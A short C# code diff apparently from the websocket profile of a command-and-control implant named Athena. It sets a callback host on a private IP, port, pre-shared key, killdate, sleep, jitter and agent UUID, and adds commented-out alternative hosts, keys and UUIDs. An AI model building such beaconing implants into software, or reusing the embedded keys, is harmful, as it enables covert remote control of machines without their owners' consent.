@@ -37,6 +37,7 @@ namespace Athena
         public Websocket()
         {
             int callbackPort = Int32.Parse("8081");
+            //string callbackHost = "ws://192.168.4.223";
             string callbackHost = "ws://192.168.4.234";
             this.endpoint = "socket";
             DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
@@ -45,12 +46,14 @@ namespace Athena
             this.userAgent = "";
             this.hostHeader = "";
             this.psk = "KdMlU0mqlqoYHV5sr4yQCfJGO3Uib2uQyMblDKiNdrE=";
+            //this.psk = "lKb443VzmD7L6sjTF+69j8D+I3CphAuS6FPCQAPf/ts=";
             this.encryptedExchangeCheck = bool.Parse("false");
             int sleep = int.TryParse("3", out sleep) ? sleep : 60;
             this.sleep = sleep;
             int jitter = int.TryParse("3", out jitter) ? jitter : 10;
             this.jitter = jitter;
             this.uuid = "eb53d24b-ae9f-4737-b8df-de8df3ed748b";
+            //this.uuid = "4def55b0-51c0-46da-bf8e-12e4604c32b6";
             if (!string.IsNullOrEmpty(this.psk))
             {
                 this.crypt = new PSKCrypto(this.uuid, this.psk);
